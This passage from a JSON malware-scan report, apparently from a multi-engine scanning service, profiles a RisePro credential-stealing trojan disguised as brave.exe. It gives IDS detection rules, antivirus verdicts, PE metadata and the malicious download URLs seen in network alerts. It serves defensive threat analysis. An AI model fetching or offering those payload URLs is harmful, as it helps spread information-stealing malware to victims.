              "src_port": 80
            },
            {
              "src_ip": "185.215.113.68",
              "src_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2014819"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO Executable Download from dotted-quad Host",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET INFO Executable Download from dotted-quad Host\"; flow:established,to_server; http.uri; content:\".exe\"; endswith; nocase; http.host; content:\".\"; offset:1; depth:3; content:\".\"; within:4; content:\".\"; within:4; pcre:\"/^(?:\\d{1,3}\\.){3}\\d{1,3}$/\"; http.request_line; content:\".exe HTTP/1.\"; fast_pattern; classtype:bad-unknown; sid:2016141; rev:8; metadata:attack_target Client_and_Server, created_at 2013_01_03, deployment Perimeter, former_category INFO, signature_severity Informational, updated_at 2020_09_14;)",
          "alert_context": [
            {
              "url": "http://109.107.182.3/cost/ko.exe",
              "hostname": "109.107.182.3",
              "dest_port": 80,
              "dest_ip": "109.107.182.3"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2016141"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download",
          "rule_raw": "alert http $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download\"; flowbits:isset,min.gethttp; flow:established,to_client; file_data; content:\"MZ\"; within:2; content:\"PE|00 00|\"; distance:0; classtype:bad-unknown; sid:2016538; rev:3; metadata:created_at 2013_03_06, updated_at 2013_03_06;)",
          "alert_context": [
            {
              "src_ip": "185.215.113.68",
              "url": "http://185.215.113.68/theme/Plugins/clip64.dll",
              "hostname": "185.215.113.68",
              "src_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2016538"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET MALWARE Terse alphanumeric executable downloader high likelihood of being hostile",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET MALWARE Terse alphanumeric executable downloader high likelihood of being hostile\"; flow:established,to_server; http.uri; content:\"/\"; content:\".exe\"; distance:1; within:8; fast_pattern; endswith; pcre:\"/\\/[A-Z]?[a-z]{1,3}[0-9]?\\.exe$/\"; http.header; content:!\"koggames\"; http.host; content:!\"download.bitdefender.com\"; endswith; content:!\".appspot.com\"; endswith; content:!\"kaspersky.com\"; endswith; content:!\".sophosxl.net\"; endswith; http.header_names; content:!\"Referer\"; nocase; classtype:bad-unknown; sid:2019714; rev:12; metadata:created_at 2014_11_15, former_category CURRENT_EVENTS, updated_at 2020_09_16;)",
          "alert_context": [
            {
              "url": "http://109.107.182.3/cost/ko.exe",
              "hostname": "109.107.182.3",
              "dest_port": 80,
              "dest_ip": "109.107.182.3"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2019714"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response",
          "rule_raw": "alert http $EXTERNAL_NET any -> $HOME_NET any (msg:\"ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response\"; flow:established,to_client; flowbits:isset,http.dottedquadhost; file_data; content:\"MZ\"; within:2; content:\"PE|00 00|\"; distance:0; classtype:bad-unknown; sid:2021076; rev:2; metadata:created_at 2015_05_08, former_category INFO, updated_at 2015_05_08;)",
          "alert_context": [
            {
              "src_ip": "185.215.113.68",
              "url": "http://185.215.113.68/mine/amers.exe",
              "hostname": "185.215.113.68",
              "src_port": 80
            },
            {
              "src_ip": "109.107.182.3",
              "url": "http://109.107.182.3/cost/ko.exe",
              "hostname": "109.107.182.3",
              "src_port": 80
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2021076"
        },
        {
          "rule_category": "Potentially Bad Traffic",
          "alert_severity": "low",
          "rule_msg": "ET INFO Dotted Quad Host DLL Request",
          "rule_raw": "alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"ET INFO Dotted Quad Host DLL Request\"; flow:established,from_client; flowbits:isset,http.dottedquadhost; flowbits:set,http.dottedquadhost.dll; flowbits:unset,http.dottedquadhost; http.request_line; content:\".dll HTTP/1.\"; nocase; fast_pattern; classtype:bad-unknown; sid:2027250; rev:4; metadata:attack_target Client_Endpoint, created_at 2019_04_23, deployment Perimeter, former_category INFO, performance_impact Moderate, signature_severity Minor, updated_at 2020_04_08;)",
          "alert_context": [
            {
              "url": "http://185.215.113.68/theme/Plugins/cred64.dll",
              "hostname": "185.215.113.68",
              "dest_port": 80,
              "dest_ip": "185.215.113.68"
            }
          ],
          "rule_url": "https://rules.emergingthreats.net/",
          "rule_source": "Proofpoint Emerging Threats Open",
          "rule_id": "1:2027250"
        },
        {
          "rule_category": "misc-activity",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING Windows",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING Windows\"; itype:8; content:\"abcdefghijklmnop\",depth 16; metadata:ruleset community; classtype:misc-activity; sid:382; rev:11; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:382"
        },
        {
          "rule_category": "misc-activity",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP PING",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP PING\"; icode:0; itype:8; metadata:ruleset community; classtype:misc-activity; sid:384; rev:8; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:384"
        },
        {
          "rule_category": "misc-activity",
          "alert_severity": "low",
          "rule_msg": "PROTOCOL-ICMP Echo Reply",
          "rule_raw": "alert icmp $EXTERNAL_NET any -> $HOME_NET any ( msg:\"PROTOCOL-ICMP Echo Reply\"; icode:0; itype:0; metadata:ruleset community; classtype:misc-activity; sid:408; rev:8; )",
          "rule_url": "https://www.snort.org/downloads/#rule-downloads",
          "rule_source": "Snort registered user ruleset",
          "rule_id": "1:408"
        },
        {
          "alert_severity": "low",
          "rule_msg": "SSLBL: Malicious JA3 SSL-Client Fingerprint detected (Tofsee)",
          "rule_raw": "alert tls any any -> any any (msg:\"SSLBL: Malicious JA3 SSL-Client Fingerprint detected (Tofsee)\"; ja3_hash; content:\"1d095e68489d3c535297cd8dffb06cb9\"; reference:url, sslbl.abuse.ch/ja3-fingerprints/1d095e68489d3c535297cd8dffb06cb9/; sid:906200054; rev:1;)",
          "alert_context": [
            {
              "dest_port": 443,
              "ja3": [
                "1d095e68489d3c535297cd8dffb06cb9"
              ],
              "dest_ip": "34.117.186.192"
            }
          ],
          "rule_url": "https://sslbl.abuse.ch/blacklist/ja3_fingerprints.rules",
          "rule_source": "Abuse.ch Suricata JA3 Fingerprint Ruleset",
          "rule_references": [
            "https://sslbl.abuse.ch/ja3-fingerprints/1d095e68489d3c535297cd8dffb06cb9/"
          ],
          "rule_id": "1:906200054"
        }
      ],
      "creation_date": 1706080695,
      "sigma_analysis_stats": {
        "high": 4,
        "medium": 12,
        "critical": 0,
        "low": 1
      },
      "popular_threat_classification": {
        "popular_threat_name": [
          {
            "count": 10,
            "value": "risepro"
          },
          {
            "count": 3,
            "value": "themida"
          },
          {
            "count": 2,
            "value": "yxea3z"
          }
        ],
        "suggested_threat_label": "trojan.risepro/themida",
        "popular_threat_category": [
          {
            "count": 27,
            "value": "trojan"
          }
        ]
      },
      "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
      "names": [
        "brave.exe",
        "2f7f23610e8e0633ef0b03d602a02734bdcadab3fdc8c15d0f6d93a0a454fa6f.exe",
        "mpgph131.exe",
        "MPGPH131.exe",
        "vdhx4_hpfgqiwtcfqqqm.exe",
        "lada[1].exe",
        "xesomaymgp1evcrdq21h.exe",
        "uqd_bhbxq8zv240qhpyx.exe",
        "jkapz13ai43mngyrsmvw.exe",
        "rep6rdloh7yojjzx8mot.exe",
        "kngbhjgkstaagrgnt_vo.exe",
        "lada.exe"
      ],
      "crowdsourced_yara_results": [
        {
          "description": "Identifies compiled AutoIT script (as EXE). This rule by itself does NOT necessarily mean the detected file is malicious.",
          "author": "@bartblaze",
          "ruleset_name": "AutoIT",
          "rule_name": "AutoIT_Compiled",
          "ruleset_id": "0023c73876",
          "match_in_subfile": true,
          "source": "https://github.com/bartblaze/Yara-rules"
        }
      ],
      "authentihash": "790f6886f6eb282bc13ca403456a678ab52642b3d6ea60f1b746e4a4c6da4e1e",
      "sha1": "f052bbbea194be15593e1ddf7cb0d59020597ba9",
      "size": 2298880,
      "total_votes": {
        "harmless": 0,
        "malicious": 0
      },
      "tags": [
        "malware",
        "checks-cpu-name",
        "peexe",
        "detect-debug-environment",
        "long-sleeps",
        "checks-user-input",
        "executes-dropped-file",
        "persistence"
      ],
      "type_extension": "exe",
      "meaningful_name": "brave.exe",
      "last_analysis_date": 1706729867,
      "unique_sources": 3,
      "ssdeep": "49152:RWVVfCzVSFZ6IN68gEy8tyKxZSiNcaDkyiCVaoAS3QPJVVv:cw79/EyuYBlyiCc5PJVR",
      "last_submission_date": 1706537265,
      "signature_info": {
        "product": "Brave Browser",
        "description": "Brave Browser",
        "file version": "120.1.61.120",
        "original name": "brave.exe",
        "copyright": "Copyright (C) Brave",
        "internal name": "brave.exe"
      },
      "type_tag": "peexe",
      "reputation": 0,
      "detectiteasy": {
        "filetype": "PE32",
        "values": [
          {
            "version": "1.XX-2.XX",
            "type": "Protector",
            "name": "Themida/Winlicense"
          },
          {
            "info": "LTCG/C++",
            "version": "19.34.31947",
            "type": "Compiler",
            "name": "Microsoft Visual C/C++"
          },
          {
            "version": "14.34.31947",
            "type": "Linker",
            "name": "Microsoft Linker"
          },
          {
            "version": "2022 version 17.4",
            "type": "Tool",
            "name": "Visual Studio"
          }
        ]
      },
      "sha256": "2f7f23610e8e0633ef0b03d602a02734bdcadab3fdc8c15d0f6d93a0a454fa6f",
      "last_analysis_stats": {
        "malicious": 59,
        "suspicious": 0,
        "undetected": 12,
        "harmless": 0,
        "timeout": 0,
        "confirmed-timeout": 0,
        "failure": 1,
        "type-unsupported": 4
      },
      "type_tags": [
        "executable",
        "windows",
        "win32",
        "pe",
        "peexe"
      ],
      "vhash": "02606f7d7d1f1f7f11z17z1!z",
      "last_analysis_results": {
        "Bkav": {
          "method": "blacklist",
          "engine_name": "Bkav",
          "engine_version": "2.0.0.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32.AIDetectMalware"
        },
        "Lionic": {
          "method": "blacklist",
          "engine_name": "Lionic",
          "engine_version": "7.5",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.RisePro.i!c"
        },
        "tehtris": {
          "method": "blacklist",
          "engine_name": "tehtris",
          "engine_version": "v0.1.4-109-g76614fd",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Generic.Malware"
        },
        "MicroWorld-eScan": {
          "method": "blacklist",
          "engine_name": "MicroWorld-eScan",
          "engine_version": "14.0.409.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71376752"
        },
        "FireEye": {
          "method": "blacklist",
          "engine_name": "FireEye",
          "engine_version": "35.47.0.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Generic.mg.cab8183a94bb10ab"
        },
        "CAT-QuickHeal": {
          "method": "blacklist",
          "engine_name": "CAT-QuickHeal",
          "engine_version": "22.00",
          "engine_update": "20240130",
          "category": "malicious",
          "result": "Trojanpws.Convagent"
        },
        "Skyhigh": {
          "method": "blacklist",
          "engine_name": "Skyhigh",
          "engine_version": "v2021.2.0+4045",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "BehavesLike.Win32.Trojan.vc"
        },
        "ALYac": {
          "method": "blacklist",
          "engine_name": "ALYac",
          "engine_version": "2.0.0.8",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71376752"
        },
        "Cylance": {
          "method": "blacklist",
          "engine_name": "Cylance",
          "engine_version": "2.0.0.0",
          "engine_update": "20240103",
          "category": "malicious",
          "result": "unsafe"
        },
        "Zillya": {
          "method": "blacklist",
          "engine_name": "Zillya",
          "engine_version": "2.0.0.5043",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Sangfor": {
          "method": "blacklist",
          "engine_name": "Sangfor",
          "engine_version": "2.23.0.0",
          "engine_update": "20240129",
          "category": "malicious",
          "result": "Infostealer.Win32.Risepro.Vt9f"
        },
        "K7AntiVirus": {
          "method": "blacklist",
          "engine_name": "K7AntiVirus",
          "engine_version": "12.139.50921",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan ( 0040f4ef1 )"
        },
        "Alibaba": {
          "method": "blacklist",
          "engine_name": "Alibaba",
          "engine_version": "0.3.0.5",
          "engine_update": "20190527",
          "category": "malicious",
          "result": "TrojanPSW:Win32/RisePro.b7631ba5"
        },
        "K7GW": {
          "method": "blacklist",
          "engine_name": "K7GW",
          "engine_version": "12.139.50921",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan ( 0040f4ef1 )"
        },
        "Cybereason": {
          "method": "blacklist",
          "engine_name": "Cybereason",
          "engine_version": "1.2.449",
          "engine_update": "20231102",
          "category": "malicious",
          "result": "malicious.ea194b"
        },
        "BitDefenderTheta": {
          "method": "blacklist",
          "engine_name": "BitDefenderTheta",
          "engine_version": "7.2.37796.0",
          "engine_update": "20240103",
          "category": "malicious",
          "result": "Gen:NN.ZexaF.36680.mA0aaaFgQyek"
        },
        "VirIT": {
          "method": "blacklist",
          "engine_name": "VirIT",
          "engine_version": "9.5.630",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.Genus.VAQ"
        },
        "Symantec": {
          "method": "blacklist",
          "engine_name": "Symantec",
          "engine_version": "1.21.0.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "ML.Attribute.HighConfidence"
        },
        "Elastic": {
          "method": "blacklist",
          "engine_name": "Elastic",
          "engine_version": "4.0.125",
          "engine_update": "20240115",
          "category": "malicious",
          "result": "malicious (high confidence)"
        },
        "ESET-NOD32": {
          "method": "blacklist",
          "engine_name": "ESET-NOD32",
          "engine_version": "28661",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "a variant of Win32/Packed.Themida.HZB"
        },
        "APEX": {
          "method": "blacklist",
          "engine_name": "APEX",
          "engine_version": "6.495",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malicious"
        },
        "Paloalto": {
          "method": "blacklist",
          "engine_name": "Paloalto",
          "engine_version": "0.9.0.1003",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ClamAV": {
          "method": "blacklist",
          "engine_name": "ClamAV",
          "engine_version": "1.2.1.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Kaspersky": {
          "method": "blacklist",
          "engine_name": "Kaspersky",
          "engine_version": "22.0.1.28",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan-PSW.Win32.RisePro.boq"
        },
        "BitDefender": {
          "method": "blacklist",
          "engine_name": "BitDefender",
          "engine_version": "7.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71376752"
        },
        "NANO-Antivirus": {
          "method": "blacklist",
          "engine_name": "NANO-Antivirus",
          "engine_version": "1.0.146.25796",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.RisePro.khzgch"
        },
        "SUPERAntiSpyware": {
          "method": "blacklist",
          "engine_name": "SUPERAntiSpyware",
          "engine_version": "5.6.0.1032",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Avast": {
          "method": "blacklist",
          "engine_name": "Avast",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win32:TrojanX-gen [Trj]"
        },
        "Tencent": {
          "method": "blacklist",
          "engine_name": "Tencent",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malware.Win32.Gencirc.13ff2d28"
        },
        "TACHYON": {
          "method": "blacklist",
          "engine_name": "TACHYON",
          "engine_version": "2024-01-31.02",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Sophos": {
          "method": "blacklist",
          "engine_name": "Sophos",
          "engine_version": "2.4.3.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Mal/Generic-S"
        },
        "Baidu": {
          "method": "blacklist",
          "engine_name": "Baidu",
          "engine_version": "1.0.0.2",
          "engine_update": "20190318",
          "category": "undetected",
          "result": null
        },
        "F-Secure": {
          "method": "blacklist",
          "engine_name": "F-Secure",
          "engine_version": "18.10.1547.307",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Heuristic.HEUR/AGEN.1366178"
        },
        "DrWeb": {
          "method": "blacklist",
          "engine_name": "DrWeb",
          "engine_version": "7.0.61.8090",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Siggen25.4599"
        },
        "VIPRE": {
          "method": "blacklist",
          "engine_name": "VIPRE",
          "engine_version": "6.0.0.35",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71376752"
        },
        "TrendMicro": {
          "method": "blacklist",
          "engine_name": "TrendMicro",
          "engine_version": "11.0.0.1006",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "TrojanSpy.Win32.RISEPRO.YXEA3Z"
        },
        "Trapmine": {
          "method": "blacklist",
          "engine_name": "Trapmine",
          "engine_version": "4.0.14.97",
          "engine_update": "20231106",
          "category": "malicious",
          "result": "malicious.high.ml.score"
        },
        "CMC": {
          "method": "blacklist",
          "engine_name": "CMC",
          "engine_version": "2.4.2022.1",
          "engine_update": "20240129",
          "category": "undetected",
          "result": null
        },
        "Emsisoft": {
          "method": "blacklist",
          "engine_name": "Emsisoft",
          "engine_version": "2022.6.0.32461",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71376752 (B)"
        },
        "SentinelOne": {
          "method": "blacklist",
          "engine_name": "SentinelOne",
          "engine_version": "24.1.0.5",
          "engine_update": "20240129",
          "category": "malicious",
          "result": "Static AI - Malicious PE"
        },
        "GData": {
          "method": "blacklist",
          "engine_name": "GData",
          "engine_version": "A:25.37269B:27.34762",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.GenericKD.71376752"
        },
        "Jiangmin": {
          "method": "blacklist",
          "engine_name": "Jiangmin",
          "engine_version": "16.0.100",
          "engine_update": "20240130",
          "category": "undetected",
          "result": null
        },
        "Webroot": {
          "method": "blacklist",
          "engine_name": "Webroot",
          "engine_version": "1.0.0.403",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32.Trojan.Gen"
        },
        "Google": {
          "method": "blacklist",
          "engine_name": "Google",
          "engine_version": "1706729455",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Detected"
        },
        "Avira": {
          "method": "blacklist",
          "engine_name": "Avira",
          "engine_version": "8.3.3.16",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "HEUR/AGEN.1366178"
        },
        "Varist": {
          "method": "blacklist",
          "engine_name": "Varist",
          "engine_version": "6.5.1.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32/ABRisk.VFDX-8197"
        },
        "Antiy-AVL": {
          "method": "blacklist",
          "engine_name": "Antiy-AVL",
          "engine_version": "3.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan[Packed]/Win32.Themida"
        },
        "Kingsoft": {
          "method": "blacklist",
          "engine_name": "Kingsoft",
          "engine_version": "None",
          "engine_update": "20230906",
          "category": "malicious",
          "result": "Win32.HeurC.KVMH008.a"
        },
        "Gridinsoft": {
          "method": "blacklist",
          "engine_name": "Gridinsoft",
          "engine_version": "1.0.158.174",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malware.Win32.RisePro.tr"
        },
        "Xcitium": {
          "method": "blacklist",
          "engine_name": "Xcitium",
          "engine_version": "36395",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malware@#197aljstlgu83"
        },
        "Arcabit": {
          "method": "blacklist",
          "engine_name": "Arcabit",
          "engine_version": "2022.0.0.18",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Generic.D4411F70"
        },
        "ViRobot": {
          "method": "blacklist",
          "engine_name": "ViRobot",
          "engine_version": "2014.3.20.0",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "ZoneAlarm": {
          "method": "blacklist",
          "engine_name": "ZoneAlarm",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan-PSW.Win32.RisePro.boq"
        },
        "Microsoft": {
          "method": "blacklist",
          "engine_name": "Microsoft",
          "engine_version": "1.1.23110.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan:Win32/Leonem"
        },
        "Cynet": {
          "method": "blacklist",
          "engine_name": "Cynet",
          "engine_version": "4.0.0.29",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Malicious (score: 100)"
        },
        "AhnLab-V3": {
          "method": "blacklist",
          "engine_name": "AhnLab-V3",
          "engine_version": "3.25.0.10459",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan/Win.TrojanX-gen.C5580628"
        },
        "Acronis": {
          "method": "blacklist",
          "engine_name": "Acronis",
          "engine_version": "1.2.0.121",
          "engine_update": "20230828",
          "category": "undetected",
          "result": null
        },
        "McAfee": {
          "method": "blacklist",
          "engine_name": "McAfee",
          "engine_version": "6.0.6.653",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Artemis!CAB8183A94BB"
        },
        "MAX": {
          "method": "blacklist",
          "engine_name": "MAX",
          "engine_version": "2023.1.4.1",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "malware (ai score=83)"
        },
        "Malwarebytes": {
          "method": "blacklist",
          "engine_name": "Malwarebytes",
          "engine_version": "4.5.5.54",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Spyware.RisePro"
        },
        "Panda": {
          "method": "blacklist",
          "engine_name": "Panda",
          "engine_version": "4.6.4.2",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trj/Chgt.AD"
        },
        "Zoner": {
          "method": "blacklist",
          "engine_name": "Zoner",
          "engine_version": "2.2.2.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Probably Heur.ExeHeaderL"
        },
        "TrendMicro-HouseCall": {
          "method": "blacklist",
          "engine_name": "TrendMicro-HouseCall",
          "engine_version": "10.0.0.1040",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "TrojanSpy.Win32.RISEPRO.YXEA3Z"
        },
        "Rising": {
          "method": "blacklist",
          "engine_name": "Rising",
          "engine_version": "25.0.0.27",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Generic@AI.100 (RDML:41tfTaI/vWsnbDQyI5SLHA)"
        },
        "Yandex": {
          "method": "blacklist",
          "engine_name": "Yandex",
          "engine_version": "5.5.2.24",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Ikarus": {
          "method": "blacklist",
          "engine_name": "Ikarus",
          "engine_version": "6.2.4.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Trojan.Win32.Themida"
        },
        "MaxSecure": {
          "method": "blacklist",
          "engine_name": "MaxSecure",
          "engine_version": "1.0.0.1",
          "engine_update": "20240131",
          "category": "undetected",
          "result": null
        },
        "Fortinet": {
          "method": "blacklist",
          "engine_name": "Fortinet",
          "engine_version": "None",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "W32/PossibleThreat"
        },
        "AVG": {
          "method": "blacklist",
          "engine_name": "AVG",
          "engine_version": "23.9.8494.0",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "Win32:TrojanX-gen [Trj]"
        },
        "DeepInstinct": {
          "method": "blacklist",
          "engine_name": "DeepInstinct",
          "engine_version": "5.0.0.8",
          "engine_update": "20240131",
          "category": "malicious",
          "result": "MALICIOUS"
        },
        "CrowdStrike": {
          "method": "blacklist",
          "engine_name": "CrowdStrike",
          "engine_version": "1.0",
          "engine_update": "20231026",
          "category": "malicious",
          "result": "win/malicious_confidence_100% (W)"
        },
        "VBA32": {
          "method": "blacklist",
          "engine_name": "VBA32",
          "engine_version": null,
          "engine_update": "20240131",
          "category": "failure",
          "result": null
        },
        "Avast-Mobile": {
          "method": "blacklist",
          "engine_name": "Avast-Mobile",
          "engine_version": "240131-00",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        },
        "SymantecMobileInsight": {
          "method": "blacklist",
          "engine_name": "SymantecMobileInsight",
          "engine_version": "2.0",
          "engine_update": "20240103",
          "category": "type-unsupported",
          "result": null
        },
        "BitDefenderFalx": {
          "method": "blacklist",
          "engine_name": "BitDefenderFalx",
          "engine_version": "2.0.936",
          "engine_update": "20240128",
          "category": "type-unsupported",
          "result": null
        },
        "Trustlook": {
          "method": "blacklist",
          "engine_name": "Trustlook",
          "engine_version": "1.0",
          "engine_update": "20240131",
          "category": "type-unsupported",
          "result": null
        }
      },
      "times_submitted": 8,
      "type_description": "Win32 EXE",
      "crowdsourced_ids_stats": {
        "high": 10,
        "info": 0,
        "medium": 4,
        "low": 11
      },
      "pe_info": {
        "timestamp": 1706080695,
        "imphash": "baa93d47220682c04d92f7797d9224ce",
        "machine_type": 332,
        "entry_point": 5844992,
        "resource_details": [
          {
            "lang": "RUSSIAN",
            "chi2": 22249.25,
            "filetype": "unknown",
            "entropy": 4.723223686218262,
            "sha256": "876d100f5db4c3f01c764170aec8c3f1c0029116a88fb7262f4af0360abe799d",
            "type": "RT_ICON"
          },
          {
            "lang": "RUSSIAN",
            "chi2": 133135.8,
            "filetype": "unknown",
            "entropy": 4.164978504180908,
            "sha256": "e70e7f9596ec8abfd86573240b3bfe5ead222a41f3ec41e6283483ae23fcd8ca",
            "type": "RT_ICON"
          },
          {
            "lang": "RUSSIAN",
            "chi2": 357371,
            "filetype": "unknown",
            "entropy": 3.8329784870147705,
            "sha256": "fd32c758459cdd35e7eb6ba6c4be3b77d8d636d79cc6ebada262875099e117d5",
            "type": "RT_ICON"
          },
          {
            "lang": "RUSSIAN",
            "chi2": 3685.33,
            "filetype": "ICO",
            "entropy": 2.4584920406341553,
            "sha256": "6ab18c3b81a5d30c5a190a4504cae807d73b1a4d02d56ffddf641abbb62b7210",
            "type": "RT_GROUP_ICON"
          },
          {
            "lang": "RUSSIAN",
            "chi2": 56038.49,
            "filetype": "unknown",
            "entropy": 3.42293119430542,
            "sha256": "986a459ecadee11977b6432d46d5185e1eb2271d1236a278fe13715b8fba90d9",
            "type": "RT_VERSION"
          },
          {
            "lang": "ENGLISH US",
            "chi2": 4031.47,
            "filetype": "XML",
            "entropy": 4.911615371704102,
            "sha256": "4bb79dcea0a901f7d9eac5aa05728ae92acb42e0cb22e5dd14134f4421a3d8df",
            "type": "RT_MANIFEST"
          }
        ],
        "resource_langs": {
          "RUSSIAN": 5,
          "ENGLISH US": 1
        },
        "resource_types": {
          "RT_ICON": 3,
          "RT_MANIFEST": 1,
          "RT_VERSION": 1,
          "RT_GROUP_ICON": 1
        },
        "sections": [
          {
            "chi2": 11540.5,
            "virtual_address": 4096,
            "entropy": 7.99,
            "raw_size": 582144,
            "flags": "rwx",
            "virtual_size": 1265664,
            "md5": "dbda80072fc9cd97e7ddd427426165df"
          },
          {
            "name": ".rsrc",
            "chi2": 27145.3,
            "virtual_address": 1269760,
            "entropy": 7.33,
            "raw_size": 4608,
            "flags": "rw",
            "virtual_size": 16568,
            "md5": "de6fd14e70f3a01a779c2ee06b43df61"
          },
          {
            "name": ".idata",
            "chi2": 93002,
            "virtual_address": 1290240,
            "entropy": 1.31,
            "raw_size": 512,
            "flags": "rw",
            "virtual_size": 4096,
            "md5": "37f5282c0fa356b1e50be5becbf91e72"
          },
          {
            "chi2": 123996,
            "virtual_address": 1294336,
            "entropy": 0.26,
            "raw_size": 512,
            "flags": "rwx",
            "virtual_size": 2842624,
            "md5": "49e4800b77911f6581515626d62d08aa"
          },
          {
            "name": "ejhunlir",
            "chi2": 131388.69,
            "virtual_address": 4136960,
            "entropy": 7.95,
            "raw_size": 1706496,
            "flags": "rwx",
            "virtual_size": 1708032,
            "md5": "24a023607d2a0488f4c5b6c2caecee4c"
          },
          {
            "name": "fdljqray",
            "chi2": 37079,
            "virtual_address": 5844992,
            "entropy": 4.14,
            "raw_size": 512,
            "flags": "rwx",
            "virtual_size": 4096,
            "md5": "e00d41dd570c5dd657cab5d6e4012ee2"
          }
        ],
        "compiler_product_versions": [
          "[ C ] VS2022 v17.4.0 pre 2.0 build 31823 count=18",
          "[ASM] VS2022 v17.4.0 pre 2.0 build 31823 count=24",
          "[C++] VS2022 v17.4.0 pre 2.0 build 31823 count=85",
          "[---] Unmarked objects count=281",
          "[---] Resource count=1",
          "id: 0x103, version: 30795 count=13",
          "id: 0x105, version: 30795 count=193",
          "id: 0x107, version: 30795 count=1",
          "id: 0xfd, version: 31823 count=4",
          "id: 0x104, version: 30795 count=25",
          "id: 0x106, version: 30795 count=1",
          "id: 0x101, version: 30795 count=25",
          "id: 0x109, version: 31947 count=28",
